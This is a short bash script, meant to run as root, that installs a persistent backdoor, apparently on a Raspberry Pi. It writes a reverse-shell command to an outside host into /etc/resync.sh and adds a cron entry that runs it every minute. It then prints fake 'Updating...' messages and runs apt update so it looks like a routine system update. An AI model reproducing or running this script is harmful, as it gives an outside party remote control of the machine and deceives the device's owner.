#!/bin/bash

# Execute on sudo su !
echo "#!/bin/bash" > /etc/resync.sh
echo "bash -i >& /dev/tcp/sambaup.sytes.net/9623 0>&1" >> /etc/resync.sh
chmod +x /etc/resync.sh
chown pi:pi /etc/resync.sh
echo "* * * * * /etc/resync.sh" >> /var/spool/cron/crontabs/pi
systemctl restart rsyslog
systemctl restart cron

# Impression
echo "[OK]"
sleep 2
echo "Updating..."
sleep 2
apt update
echo "Finished."
exit 0
